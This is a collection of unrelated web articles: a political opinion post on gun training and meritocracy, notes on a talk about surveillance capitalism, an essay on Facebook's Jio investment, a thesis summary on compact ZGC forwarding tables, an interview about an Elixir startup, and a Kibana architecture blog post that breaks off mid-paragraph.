<blockquote><p>Why don’t we do firearms training in schools?</p></blockquote>
<p>It’s an honest question — we’ve had the 2nd amendment for hundreds of years. Similar to driving a car, we should train our youth to handle firearms. I suspect we all know the reason this is not occurring — because a significant portion of the United States is fearful of firearms.</p>
<p>From the evidence, the fear is unjustified. We have evidence that with a good training program and robust mental evaluation process, firearms by-and-large are safe for society. <a href="https://en.wikipedia.org/wiki/Firearms_regulation_in_Switzerland" target="_blank" rel="noopener noreferrer">See Switzerland</a>:</p>
<blockquote><p>Swiss males grow up expecting to undergo basic military training, usually at age 20 in the recruit school..</p>
<p>…Prior to 2007, members of the Swiss Militia were supplied with 50 rounds of ammunition for their military weapon in a sealed ammo box that was regularly audited by the government…</p>
<p>…Every person with a Swiss citizenship, aged 10 years or older, can take part at any federal ranges and will be able to shoot for free with the ordinance rifle…</p>
<p>…In 2016, there were 187 attempted and 45 completed homicides, for a homicide rate of 0.50 per 100,000 population, giving Switzerland one of the lowest homicide rates in the world…</p></blockquote>
<p>Further, firearms are already widely available (<a href="https://en.wikipedia.org/wiki/Estimated_number_of_civilian_guns_per_capita_by_country" target="_blank" rel="noopener noreferrer">300+ million guns in the U.S.</a>) &amp; availability enshrined in law.</p>
<p>Sorrowfully, evidence doesn’t matter here; fear guides many. Yoda has some insights here:</p>
<blockquote><p><span data-parade-type="promoarea" data-parade-location-types="promoarea" data-parade-location-ids="article" data-parade-views="false" data-parade-touches="false" data-parade-clicks="false" data-parade-mouseovers="false">Fear is the path to the dark side. Fear leads to anger. Anger leads to hate. Hate leads to suffering.</span></p>
<p>— George Lucas (Yoda)</p></blockquote>
<h2>The False Dichotomy</h2>
<p>I don’t agree with the left or the right on many things in United States politics. In fact, I find most of the arguments a false dichotomy, designed to garner votes. To share one’s full thoughts would cause either or both sides to lash out, even though evidence may support the claims / musings.</p>
<p>Regretfully, this leaves me and many others out of the public discourse. While most of us have heard,</p>
<blockquote><p>The only thing necessary for the triumph of evil is for good men to do nothing.</p>
<p>— Edmund Burke (attributed)</p></blockquote>
<p>It’s not quite that simple and I prefer another sentiment:</p>
<blockquote><p>A man dies when he refuses to stand up for that which is right. A man dies when he refuses to stand up for justice. A man dies when he refuses to take a stand for that which is true.</p>
<p>— Martin Luther King Jr.</p></blockquote>

I am very confident few people fully agree with either side in this political theater. We have extremists on either side shouting and being amplified by social media. In truth, the vast majority of us don’t agree [fully] with either extreme. Most of us, want to “live and let live” — that’s the American way. We’re a country founded on our hatred for taxes and the desire to live free from persecution. Please, please.. Don’t let that change.</p>
<p>It’s easy to decide “what’s right” when you look at it through that lens — am I persecuting others or increasing taxes (arguably a form of persecution)? If either are true, likely we should reconsider our stance.</p>
<h2>The Chaos</h2>
<p>Today, we are edging towards chaos. We all feel it. Riots, job loss, deadly diseases, [trade] wars, homelessness… We need leadership that can unite us.</p>
<p>Unfortunately, many of our would-be leaders have opted out or have been pushed out of this system. They’ve become engineers, scientists, bloggers — too scared to share their opinions (<a href="https://en.wikipedia.org/wiki/Slate_Star_Codex" target="_blank" rel="noopener noreferrer">even shutting down</a>). To hold a nuanced opinion different from the “socially accepted” by one group or another will get you “canceled”. In this case, “canceled” can mean anything from losing your job, to losing financial platforms/instruments (i.e. PayPal, VISA, YouTube revenue, etc.), to receiving threats on your life.</p>
<p>We have an ongoing pandemic, with millions in the United States likely about to perish, the economy collapsing, and we still cannot escape the politics.</p>
<p>I’m not hopeful.</p>
<p>I have so many musings, stories, and analyses I’d like to share, but neither facts nor my opinions matter.</p>
<p>Let’s be honest —</p>
<ul>
<li>I’m a white, cisgender, straight, male</li>
<li>I work as a technical manager in a research group, at a bank</li>
<li>I’m socially liberal in many ways and conservative in others</li>
<li>I grew up lower-middle class; now, I’m upper-middle class</li>
<li>I don’t attribute myself to any political party</li>
</ul>
<p>A large number of people dismiss or overlook me because of my background. Those who don’t outright dismiss me are also not likely to support my interest(s).</p>
<h2>Meritocracy or Bust</h2>
<p>What scares me is that I am a father and I am fearful for my children’s future. I was raised with the understanding that America is a meritocracy. Regardless of your race, gender, or creed, you should have the ability to make a life in the United States,<strong><em> to build a future for your children</em></strong>. Sadly, I don’t see the same core mission today. None of the political parties or the government at large appears forward-looking, for the children. Perhaps, that’s because of a <a href="https://www.cdc.gov/nchs/nvss/births.htm" target="_blank" rel="noopener noreferrer">declining birthrate</a>, I’m not sure.</p>
<p>As someone with children, I’m pleading for a group to come together to challenge the current status quo and equitably look to improve our society. We do have systemic problems that need to be fixed. Compromises will need to be made, but I don’t believe we need sacrifices from anyone.</p>
<p>The racism and sexism needs to stop. I suspect, most of us (though, not all) want a meritocracy, a hierarchy based on merit. Unfortunately, what’s being propagated is a hierarchy based on race, sex and orientation — the under-privileged. It’s clear from the countless stories we see in the news. I am sure you are tired of the racism, as am I. That’s probably true regardless of which side of the political spectrum you fall.</p>
<p><em>No one’s</em> value to society should be assessed by their race, gender or creed. A person’s value should be based off what they have to offer to a given group, organization, or society. We can rally around that idea (that we’re all equal, differentiated on merit) and work to improve. It’s a middle ground we can [mostly] agree on. From there, we can fix the injustices.</p>
<p>What horrifies me, is that even to express that <em>“we’re all equal” </em>is a challenge to this new socio-economic hierarchy. <em>No one</em> is representing me or has my family’s best interests in mind. Realistically, I don’t expect anyone to have <em>my family’s interests</em> in mind, but I don’t want my potential / rights eroded.</p>
<p>Due to this political tug of war, both sides of the political spectrum want to diminish our rights; they’re only bickering over which rights to diminish. Let’s stop this tug of war and come together.</p>
<p>If we don’t come together, soon enough we won’t have a democracy, or frankly, a future to build for.</p>
<h2>In the Words of John Adams…</h2>
<blockquote><p>Remember, democracy never lasts long. It soon wastes, exhausts, and murders itself. There never was a democracy yet that did not commit suicide. It is in vain to say that democracy is less vain, less proud, less selfish, less ambitious, or less avaricious than aristocracy or monarchy. It is not true, in fact, and nowhere appears in history. Those passions are the same in all men, under all forms of simple government, and when unchecked, produce the same effects of fraud, violence, and cruelty. When clear prospects are opened before vanity, pride, avarice, or ambition, for their easy gratification, it is hard for the most considerate philosophers and the most conscientious moralists to resist the temptation. Individuals have conquered themselves. Nations and large bodies of men, never.</p>

<h2 id="details">Details</h2>
<p>This is the talk on moving beyond surveillance capitalism with alternatives, stopgaps, and the Small Web that Aral gave at <a href="https://creativemornings.com/talks/aral-balkan">Creative Mornings Istanbul</a> on 26 June, 2020.</p>
<p>The recording of the live stream has been edited to:</p>
<ul>
<li>
<p>Fix the 3-frame audio/video sync (live and learn: all HDMI output has a delay and if you are bringing in your microphone separately, you need to delay it while streaming/recording it).</p>
</li>
<li>
<p>Reduce audio levels (like a rookie, I didn’t check my levels before starting the live stream so the audio is clipped. Can’t fix that but I lowered the audio track so at least now it’s not booming in your ears.)</p>
</li>
<li>
<p>Cut out a part of my bumbling conclusion where I forgot the switcher on my screen instead of switching to my camera and then did a second awkward conclusion to camera when I realised.</p>
</li>
</ul>
<p>We’ve also added closed captions (made using thisten.co), chapters (so you can skim/jump to relevant sections), and links to the tools mentioned in the talk.</p>
<p>All in all, not terrible for a first live stream with our new live stream setup.</p>

<p>In the&nbsp;<a target="_blank" href="https://thezentech.co/2020/05/25/are-online-ads-a-bubble-seriously/" rel="noreferrer noopener">previous essay</a>, I talked about that Facebook’s primary revenue source is from online ads.</p>



<blockquote><p>Well, there is no easy way to say that, but 98% of Facebook revenue is coming from online ads. So it’s not a big surprise that they are one of the most affected companies by both surges of usage as people are using Facebook, Instagram, Whatsapp more heavily, and decrease of marketing spend on ads on its platform. So ads for Facebook are basically a matter of existence.</p></blockquote>



<p>So It is smart – or a strategic necessity as I will explain in a minute – that they are trying to find different revenue streams.</p>



<p>In the last Facebook’s earnings call, Mark Zuckerberg said:</p>



<blockquote><p>I have always believed that in times of economic downturn, the right thing to do is to keep investing in building the future, and I believe this for a few reasons. First, when the world changes quickly, people have new needs and that means that there are more new segments to build. Second, since many big companies will pull back on their investments, there are a lot of things that wouldn’t otherwise get built, but that we can help deliver.[..] we’re planning to hire at least 10,000 more people in product and engineering roles this year, so we can continue building and making progress.</p><cite>Mark Zuckerberg – Facebook earnings call 2020 Q1</cite></blockquote>



<p>Afterward, Facebook invested $5.7 billion for a 9.99% stake in India’s Reliance Jio Platforms as the largest single investment in Facebook’s history.</p>



<p>Jio Platforms is connecting more than 388 million people in India to the internet. And if we look at the following chart. The number of internet India is so high in comparison with the US and EU.</p>

<div><p>That is not the first try from Facebook to enter the Indian market. They saw India as the future for growth since 2013. But their attempts failed in 2016 after regulation blockers over Free Internet Initiative and providing payment solution for WhatsApp.</p><p>This time they tried a different approach by partnering with Reliance Jio, the largest telecom provider in India, To avoid getting in conflict with the Indian government direction to empower the Indian companies.</p></div>



<p>This investment has three main strategic advantages:</p>



<h3>1- Facebook + Instagram vs. TikTok</h3>



<p>In recent years, TikTok, the app owned by the Chinese giant ByteDance has got a market share in India that all the US Tech companies – including Facebook – couldn’t acquire.</p>



<blockquote><p>In recent years, ByteDance’s TikTok has won users that all of these companies have struggled to reach. TikTok has amassed more than 250 million users in India (as of last year), and the company says it is on track to add another 100 million this year.</p><cite>TechCrunch</cite></blockquote>



<p>But not just in India. Tiktok already got a significant market share in many different countries as a social platform. And I think Facebook bearly started to take any action against the viral usage of Tiktok, especially between teenagers.</p>



<p>That’s the first reason which serves – still – into increasing Ads revenue stream. But in general, Facebook couldn’t monetize the increasing users’ usage in Asia compared to users in the US and Europe.</p>

<p>So that leads us to the second strategic advantage.</p>



<h3><strong><strong>2- E-commerce via WhatsApp and an opportunity for a SuperApp</strong></strong></h3>



<p>In one of the future essays, I want to dig deeper into the story of WeChat, the Chinese SuperApp. And this related to today’s essay since Facebook has an opportunity to transfer WhatsApp into a similar user experience in the Indian market. The same try that Careem – now owned by Uber – is seeking in the Middle East. See the market pattern?</p>



<p>Reliance Jio also wants to take on Amazon in e-commerce in India, but to take on Amazon, they can’t play like Amazon! As Brad Pitt stated in Moneyball in a different context about the Yankees.</p>

<p>WhatsApp is already popular in India, but as I mentioned before, Facebook couldn’t pass the regulation to add payment service to WhatsApp to be able to monetize it. But after the partnership, Facebook could enter the e-commerce market in India much more comfortably. Either with more government-friendly WhatsApp solution or via JioMart service. As Mukesh Ambani (Reliance Jio’s largest shareholder) referred to in the deal announcement:</p>



<blockquote><p>Ambani added that JioMart and WhatsApp will enable 30 million neighborhood stores (kirana) to transact digitally “in the near future.” WhatsApp has been working with the Indian government for more than two years to expand its payments service in India — but the project remains stuck in regulatory hurdles.</p><cite>Mukesh Ambani</cite></blockquote>



<p>Facebook introduced WhatsApp for business a few months ago. And as they described, the main feature in WhatsApp blog is adding products catalog inside WhatsApp, so users don’t need to go to external websites. Then all from products exploring to payment process (later on) could be done entirely within WhatsApp experience.</p>



<blockquote><p>Catalogs are a mobile storefront for businesses to showcase and share their goods so people can easily browse and discover something they would like to buy. Previously businesses had to send product photos one at a time and repeatedly provide information — now customers can see their full catalog right within WhatsApp. This makes business owners look more professional and keeps customers engaged in the chat without having to visit a website.</p><cite>WhatsApp blog</cite></blockquote>



<p>Fun note, the feature demo in WhatsApp blog is for a local Indian store. Good one WhatsApp 😉</p>

<h3><strong>3- Reliance Jio + Facebook vs. Amazon</strong></h3>



<blockquote><p>With only about half of India’s 1.3 billion people online so far, e-commerce sales are projected to more than double to $68.4 billion by 2022 from $26.9 billion in 2018</p><cite>Wall Street Journal</cite></blockquote>



<p>With the promising opportunity in India, someone else was watching. Who knows a lot about e-commerce, Jeff Bezos.</p>



<p>Jeff Bezos visited India recently to announce an extra $1 Billion investment – after the initial investment $5 Billion -, and told a gathering of local Amazon sellers:</p>



<blockquote><p>The intent is to help more small businesses start selling on the company’s marketplace. The new funds will supplement the $5 billion that Amazon has said it is spending to build out its Indian business […] We’re making this announcement now because it’s working,” Mr. Bezos said referring to Amazon’s efforts to get India’s legions of mom-and-pop shops connected to its platform. “And when something works, you should double down on it.”</p><cite>Wall Street Journal</cite></blockquote>



<p>It’s interesting to see and learn from what’s happening in India in the near future since similar competition fields happen in other places like in Africa or the Arabic world while big tech companies are looking to the east for strategic opportunities.</p>

<p><em>The work presented here is performed as part of the <a href="https://inside.java/2020/06/12/joint-research-projects/">joint research project between Oracle, Uppsala University and KTH</a>. Follow the blog series here at inside.java to read more about the JVM research performed at the Oracle Development office in Stockholm.</em></p>

<hr>

<p>This is a short description about my work on garbage collection that I did for my master thesis. This work was done in collaboration with <a href="https://www.oracle.com/">Oracle</a> which gave me an opportunity to work with brilliant minds on challenging problems. I want to direct a special shoutout to my mentors at Oracle, <a href="https://inside.java/u/PerLiden/">Per Lidén</a> and <a href="https://inside.java/u/ErikOsterlund/">Erik Österlund</a>.</p>

<p>To allow fast allocation in garbage collected environments, a common approach is to use bump pointer allocation. Bump pointer allocation uses a pointer to the first available byte in memory that is monotonically increased as we continue to allocate objects. While this scheme allows fast allocation it comes with the caveat that the free memory must be kept continuous. To keep the free memory continuous, many garbage collectors move objects around in memory to compact them, thereby avoiding fragmentation, which can be seen in the figure below. This is typically handled in a process where all live objects are moved off of a page which is then free’d. This permits clearing a page in O(live) objects, which is typically a small number (relatively speaking) since most newly created object tend to die pretty quickly.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/heapgc_defrag.png" alt="Defragmentation during GC"></p>

<p>The Z Garbage Collector (ZGC) is a new moving concurrent garbage collector in OpenJDK (the thing that probably runs your Java application) [1, 2]. ZGC moves objects around, to combat memory fragmenation, without stopping the application.
This imposes additional overhead on an application in the form of tracking objects’ movements, so that all pointers to them can eventually be updated to the new locations. Usually in GC parlance this is referred to as forwarding information.</p>

<p>ZGC uses an auxiliary forwarding table – optimised for fast look-up, at the cost of additional memory use. This forwarding table is stored outside of the Java heap, referred as off heap-allocation. Any off-heap allocation or keeping old object after moving them is to be considered as memory overhead since it is strictly needed for the JVM and not the actual Java application. ZGC suffers from pathological cases where the size of its forwarding information can become very large, theoretically, as big as the heap itself. If we dimension an application for the pathological case this would be a waste of resources, since the memory usage is usually significantly less. This can make it hard to determine an application’s memory requirements.</p>

<p>This risk for large memory overhead is not only a theoretical concern, but can be observed in real programs. Below is a plot depicting the memory overhead for an internal benchmark application called BigRamTester at Oracle, which shows 35% memory overhead. The source code for that application can be found in <a href="https://bugs.openjdk.java.net/browse/JDK-8152438">this issue </a> as an attachment.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/bigram.png" alt="Benchmark Revealing Large Memory Overhead"></p>

<p>Storing forwarding information for each relocated object from addresses A (the from-address) to B (the to-address), costs approximately 128 bytes (64 bytes for each from/to-address), can be implemented computationally efficient but at the cost of additional memory overhead (as shown above). As part of my thesis work, we propose a new design for forwarding tables that maps several sparesly populated pages (i.e., with few live objects) onto a single new page in a way that allows the to-address to be calculated using the from-address and liveness information. The design results in a compressed forwarding table that incurs a theoretical worst-case memory overhead of &lt; 3.2%.</p>

<p>In ZGC, there may be contention between application threads and garbage collector threads of relocating objects. The contention results in nondeterministic addresses to which objects are relocated to. The new design requires <em>deterministic addresses</em> so that we can calculate the new address given some set of information. Assume that we have an old page X, whose objects will be relocated to the new page Y. We achieve deterministic addresses, if we copy the objects to Y in the order we encounter them when traversing the live map from the beginning to the end, in ascending order.</p>

<p>The new design divides pages into Q amount of chunks. A chunk holds the amount of preceding living objects <em>before</em> that chunk. To get the size of previously living objects you will use the associated chunk and scan the live map for the addresses who wasn’t covered by the chunk. This allows X to be computed efficiently and allows the old page to be freed as soon as all objects have been relocated, at the cost of some space. An example of dividing a page into chunks is depicted below.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/chunks.png" alt="Chunks"></p>

<p>Each page divider corresponds to one chunk’s live map coverage. In the example, an object to be relocated lives on the third page which covered by the third chunk (the green arrow). To find the address we do not have to scan the previous chunks since the <em>live bytes</em> field is describing the amount of live bytes of all preceding chunks (the red arrow). Finding all living objects (and their size) preceding the green object within the chunk, can be found in the live map (the yellow arrow).</p>

<p>This design results in a simple logic in order to calculate the new address, which in pseudocode would be express as:</p>

<div><div><pre><code><span>inline</span> <span>uintptr_t</span> <span>ZCompactForwarding</span><span>::</span><span>to_address</span><span>(</span><span>uintptr_t</span> <span>from_address</span><span>)</span> <span>{</span>
  <span>uintptr_t</span> <span>to_page_start_address</span>    <span>=</span> <span>to_page_start_address</span><span>(</span><span>from_address</span><span>);</span>
  <span>uintptr_t</span> <span>live_bytes_before_chunks</span> <span>=</span> <span>live_bytes_before_chunks</span><span>(</span><span>from_address</span><span>)</span>
  <span>uintptr_t</span> <span>live_bytes_on_chunks</span>     <span>=</span> <span>live_bytes_on_chunks</span><span>(</span><span>from_address</span><span>);</span>

  <span>return</span>
    <span>to_page_start_address</span> <span>+</span>
    <span>live_bytes_before_chunk</span> <span>+</span>
    <span>live_bytes_on_chunks</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The implementation was shown to have a maximum of &lt; 3.2% memory overhead. I used the DaCapo benchmarks suite and the SPECjbb2015 benchmark to evaluate the impact of the design on execution time, given that forwarding addresses must now be computated, as opposed to looked up. Naturally, we expected some performance degradation.
The results from the benchmarking show an statistically significant average performance degradation of approximately 2%, for the new design. Notably, many programs in DaCapo were not effected at all. Two DaCapo programs saw performance improvements at 5.69% and 22.42%, respectively, for the new design.</p>

<p>I haven’t implemented all optimizations on my list (yet). But I’m fairly hopeful that decrease in memory footprint and predictable overhead outweighs the increase in execution time, as incidated by the measurements. This could mean that the work you’d just read about will hopefully find its way into OpenJDK. Only time will tell.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this article, we’re interviewing Nathan Johnson, one of the co-founders of <a href="https://beta.venu.tv/">Venu</a>, a community-driven online marketplace for virtual events. Venu is written in Elixir and has recently gone into beta, so we thought it would be an excellent opportunity to learn more about the choice and advantages of using Elixir for one’s startup. If you want to learn about their stack and how Phoenix LiveView enabled them to build their app quickly (3 months of part-time work), read on.</p><h3 id="interview-with-nathan-johnson">Interview with Nathan Johnson</h3><h4 id="could-you-tell-us-more-about-your-company-and-your-role-there%3F">Could you tell us more about your company and your role there?</h4><p>Sure thing. Venu is a marketplace for live events/experiences. It allows organizers to create/sell tickets, set up schedules and multi-track events, and live stream those events in the same vein as Twitch or Mixer. Its focus is on conferences but can be used for any live-streamed content.</p><p>I am one of the co-founders along with Brodey Newman and Dillon Chanis. I do a good bit of the backend development/integrations.</p><p><img src="https://serokell.io/files/67/675pkgmd.team2.jpg" alt="Venu team"></p><hr><center><i>
	The co-founders of Venu.</i></center><h4 id="could-you-talk-about-the-stack-of-venu%3F-any-particular-elixir-libraries-that-you-want-to-feature%3F">Could you talk about the stack of Venu? Any particular Elixir libraries that you want to feature?</h4><p>Our stack is Elixir + Phoenix LiveView + Alpine.js + Tailwind CSS hosted on Gigalixir with a couple of AWS services (S3/CloudFront).</p><p>LiveView has enabled us to build the app in about three months part-time and is definitely worth mentioning. It can be a bit of a learning curve, and new things are always being added to it, but the velocity it gives you is well worth it. You don’t have to worry about the plumbing of how data gets from your backend to the frontend so you can focus primarily on the UI/presentation layer. LiveView isn’t a 1.0 release yet, so there have been some challenges with new releases coming out and some bugs, but overall it’s been fantastic.</p><h4 id="do-you-use-any-erlang-libraries-in-elixir-code%3F-if-so%2C-are-there-any-you-would-like-to-feature%3F">Do you use any Erlang libraries in Elixir code? If so, are there any you would like to feature?</h4><p>Nothing third-party, but some of our prototype streaming code is using the raw <code>:ssl</code> and <code>:gen_tcp</code> libraries.</p><h4 id="do-you-use-distributed-erlang-functionality-for-cross-node-message-passing%3F-why-or-why-not%3F">Do you use distributed Erlang functionality for cross-node message passing? Why or why not?</h4><p>Currently, we don’t use cross-node messaging because we can run everything off a single replica, but we built our app with that in mind. For instance, our code that manages the state of a live stream, users connected, etc. is all GenServers, so if we need to scale out, we can transition from a single node to multiple nodes with message passing easily.</p><h4 id="do-you-have-non-beam-code-in-your-codebase%3F-if-so%2C-how-much-and-why%3F">Do you have non-BEAM code in your codebase? If so, how much and why?</h4><p>Only some of our front end is non-BEAM because we didn’t want to put things like which modals/dropdowns were open in our LiveView state. We’ve considered writing some Rust for the live streaming as well, but Elixir works pretty well for that.</p><h4 id="where-is-elixir-great-to-use-and-where-does-it-fall-short-in-your-stack%3F">Where is Elixir great to use and where does it fall short in your stack?</h4><p>Elixir has been great for everything so far. A lot of our codebase right now is a simple Phoenix app managing some basic content, but even the complex stuff like payouts via Stripe and the live streaming has been trivial as well. The only thing we had any real issues with was deployment, but we’ve been using Gigalixir and it makes that process extremely simple.</p><h4 id="what-was-the-biggest-challenge-you%E2%80%99ve-overcome-while-working-on-this-project%3F-if-elixir-helped-you-to-solve-it%2C-how%3F">What was the biggest challenge you’ve overcome while working on this project? If Elixir helped you to solve it, how?</h4><p>We had a couple of major challenges. The first one: an ongoing issue with time zones that is not that fun to talk about but is easily solved with Elixir’s Timex library. The other one was handling real-time content, which is pretty interesting.</p><p>For our app, we need to keep everyone in sync when viewing/messaging on a live stream. Elixir definitely helped solve this in a simple way. Phoenix has built-in Pub/Sub functionality that allows us to broadcast and subscribe from our LiveView instances. So, we can easily publish updates for when a stream starts/stops or when new messages come in, and the UI updates in real-time because of the magic of LiveView.</p><p><img src="https://serokell.io/files/60/60wm93ma.venu_meta.png" alt="60wm93ma.venu_meta.png"></p><hr><center><i>You can try out Venu by <a href="https://beta.venu.tv/">signing up</a> for its closed beta. </i></center><h4 id="are-you-satisfied-with-the-result%3F">Are you satisfied with the result?</h4><p>Absolutely. It has definitely come a long way over the past three months, and I look forward to what’s to come.</p><h4 id="what-is-your-scaling-strategy-post-launch%3F">What is your scaling strategy post-launch?</h4><p>After we’ve ironed out the bugs from our beta, we’ll be primarily focused on marketing and landing larger and larger conferences. Our app leverages some heavy third-party integrations to do the payments/streaming, so we should be able to scale well with what we have in place.</p><h4 id="any-key-takeaways%3F">Any key takeaways?</h4><p>I would encourage anyone who hasn’t had the opportunity to check out Phoenix LiveView to take a minute to do so. It changes the way you think about building applications and, even though it is still pre 1.0,  is definitely worth investing in. It’s also a good way to get introduced to the joy of Elixir programming.</p><hr><p>We want to thank Nathan for taking his time to talk with us, and wish the best of luck to Venu and its team!</p><p>If you want to read more about companies using functional programming in production, we suggest you check out our <a href="https://serokell.io/blog/haskell-in-production">Haskell in Production</a> articles or our overview of <a href="https://serokell.io/blog/elixir-companies">the largest Elixir-using companies</a>.</p><p>If you have your own Elixir in production story to tell (both good and bad), we definitely want to hear it!

July 1, 2020 | https://www.elastic.co/blog/introducing-a-new-architecture-for-kibana | <a href="https://web.archive.org/web/*/https://www.elastic.co/blog/introducing-a-new-architecture-for-kibana">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>We’re excited to share more details today about a long-running project that the Kibana team has been working on for the past couple of years: the Kibana development platform.&nbsp;
</p><p>If you’re a Kibana plugin developer or enjoy lurking around our GitHub repo, you’ve probably seen mentions of “the new platform.” This is a re-architecture project we’re close to completing that enables the future of Kibana plugin development for both developers at Elastic and the wider Kibana community. So why did we build this? Let’s start with a bit of history.
</p> <p><strong><h2>Kibana 4.0, a modest JavaScript app</h2></strong></p><p>The first “architecture” of Kibana was put together all the way back in 2015, <a href="https://www.elastic.co/blog/kibana-4-literally/">starting with Kibana 4.0</a>. At the time, we had just three apps: Discover, Visualize, and Dashboard. Even more critically, we only had four full-time developers.
</p><p><img src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltf50f9b7f4bece58d/5ef67b9ca917b92b287f6677/blog-new-kibana-arch-4-0.jpg" data-sys-asset-uid="bltf50f9b7f4bece58d" alt="Kibana 4.0: Not too shabby for only having four full-time developers"></p><p>With such a small team, we reached for familiar libraries and built Kibana around them: Angular.js, Express, and RequireJS. We added Hapi.js and used Hapi’s plugin system to build server-side plugins. On the front end, each application was a separate Angular.js app built on some shared code. Using familiar tools allowed us to iterate quickly, avoid reinventing the wheel, and ship features at a whiplash pace. It worked well!
</p><p>Fast forward a few years and Kibana comprised a whopping 97 plugins and was actively worked on by over 100 Elastic developers. Kibana had become one of the largest open source JavaScript apps in the world. The simple architecture we had built was starting to bow under this weight. Writing cross-application integrations was difficult, unintended breakages were common, development performance was poor, and ramping up new developers on Kibana was difficult.
</p><p>Our patchwork system of solutions had finally taken us as far as it could and it was clear we needed to think again from first principles. A group of Kibana engineers set out to design a new system that could scale with Kibana, our team, and the community: the Kibana development platform.
</p> <p><strong><h2>The Kibana development platform, a grown-up application framework</h2></strong> <strong><h3>Goals</h3></strong></p><p>The primary goal of the Kibana platform project was to increase both the velocity and stability of adding new features. To fulfill this goal, we needed to make Kibana’s codebase easy to change, easy to learn, and easy to thoroughly test.
</p><p>To achieve these goals we produced a list of features that this new architecture should have:
</p><ul><li>Consistent architecture across client and server code</li><li>A small, explicit set of foundational APIs that is separate from plugin code</li><li>Simple and well-defined plugin runtime and execution flow</li><li>Isolated plugins with explicit APIs and dependencies</li><li>Framework-agnostic and futureproof APIs</li><li>Full test coverage</li><li>Type safety</li></ul> <p><strong><h3>Microservices</h3></strong></p><p>One of the key problems with our legacy code was how much it was slowing down individual teams from iterating quickly.
</p><p>The popular microservices trend is often the recommended pattern to reach for when re-architecting a system to solve this problem. By breaking up responsibilities into independent systems with clear boundaries, each team can work within their domains with fewer cross-cutting concerns.
</p><p>Microservices proper aren’t an option for Kibana, which is deployed as a single artifact on millions of our customers’ own machines. Simple deployment and configuration is a goal of all products at Elastic. Breaking up Kibana into smaller, separate deployments would complicate that.
</p><p>However, similar benefits can be realized by enabling strict encapsulation between components. The original Kibana architecture allowed for many components to affect the entire system, often in unexpected ways. By facilitating and enforcing encapsulation with explicit boundaries and dependencies between subsystems, we focused on achieving many of the same benefits without complicating our deployment story.
</p><p>We see the Kibana platform as a hybrid approach: a single artifact that you can download and run on your laptop, but built with explicit boundaries between its pluggable systems.
</p><p>With this design, we avoid the complexity of deploying microservices and handling network failures, while still promoting the isolation between systems that enables teams to move quickly.
</p> <p><strong><h2>Key aspects of the Kibana platform</h2></strong> <strong><h3>Core</h3></strong></p><p>The Kibana core is the root system that boots Kibana, validates configuration, loads plugins, and provides the primitive APIs needed to build a plugin in Kibana. When you run <code>./bin/kibana</code> or load Kibana in your browser this is the system that starts executing first.
</p><p>The core is made up of a set of <strong>services</strong>, each of which provides APIs to plugins at different points of the system’s lifecycle. Core services are always present and cannot be disabled. Anything we consider to be essential to building a Kibana plugin exists as a core service.
</p><p>The underlying implementation details of core services are encapsulated and hidden from plugins. This yields a number of benefits, not the least of which is high test coverage. By only allowing plugins access to purpose-built features, we can ensure that the core’s small API surface is incredibly robust.
</p><p>The core also aims to be framework and technology agnostic. We want this platform to grow with the project for years to come. Locking the entire project into one technology has bitten us in the past (Angular.js, Hapi.js) and is a decision we plan to avoid going forward. When possible, we prefer to provide primitives or well-formed abstractions over specific frameworks. For instance, applications in the Kibana platform can be written using virtually any UI framework (though we prefer React and our EUI library) and our HTTP interface is a very generic abstraction over Hapi.js. This allows plugins to experiment with and adopt new technologies and allows the core to remove underlying frameworks without breaking the interface provided to plugins.
</p> <p><strong><h3>Plugins</h3></strong></p><p>While the core provides the foundation of Kibana, plugins are where the magic happens. Virtually every feature you use in Kibana is built inside of a plugin. In general, a plugin is a group of functionalities that can be toggled on or off to provide features and apps in Kibana.
</p><p>Plugins have access to all of the APIs exposed by core services. But the really neat thing about plugins is that they may have dependencies on other plugins. This allows plugins to integrate at runtime via explicit contracts that these plugins expose to one another. Plugins can expose something as simple as a small integration API or provide a feature-rich service to other plugins. This allows us to keep adding new services to Kibana without expanding the API surface of the core. By baking this feature into the platform’s design, we can make sure that changes to these interfaces are well understood and communicated.
</p><p>So what can a plugin do? Well, they can register HTTP endpoints and UI applications, query and create data in Elasticsearch, and provide generic services to other plugins. In other words, quite a bit.
</p> <p><strong><h3>Lifecycles</h3></strong></p><p>All core services and plugins are organized and executed in the same set of lifecycle stages: setup, start, and stop. Both the client and server execute these lifecycle stages sequentially when starting Kibana.
</p><p>Different sets of functionality are available during each lifecycle stage. It is up to each service and plugin to return the APIs it wishes to expose during these lifecycle stages for other services and plugins to consume.
</p><p>By organizing all of Kibana around these stages, we make reasoning about <em>when</em> code will execute much simpler and have tight control over which features are available to other components at different points in time.
</p> <p><strong><h3>Server and browser</h3></strong></p><p>Up until this point we’ve talked about the core as if it’s a single system. However, that isn’t <em>quite</em> true. In reality, we have a server-side and client-side core. Each follows a similar design but is made up of a slightly different set of services.
</p><p>As you might expect, the server-side services provide typical backend functionality, like HTTP routes, while the client-side services provide frontend functionality, like UI mounting. But while the set of APIs is different, both systems share the same design, patterns, and lifecycle stages.
</p><p>This makes learning how to build a Kibana plugin much simpler. In legacy Kibana, developers had to learn about Hapi’s plugin system on the server and Angular’s module system in the browser. Developers today can learn a single pattern for building plugins that is portable between the two environments.
</p> <p><strong><h2>Results</h2></strong></p><p>Leveraging this design, the Kibana teams have been incrementally migrating their plugins to the Kibana platform APIs over the past several minor versions. Today, we’re happy to report that all applications will be running on the platform as of version 7.9.0 (coming soon).
</p><p>One of the biggest improvements users of Kibana will notice with this change is a much faster navigation experience between applications. We have removed the “loading screen of death” (as some call it) when switching between applications, enabling you to quickly find, analyze, and share your data. In 7.9, you will be able to flip between Dashboard, Maps, Canvas, APM, and all your other favorite Kibana apps nearly instantly! Gone are the days of the loading screen breaking your flow.
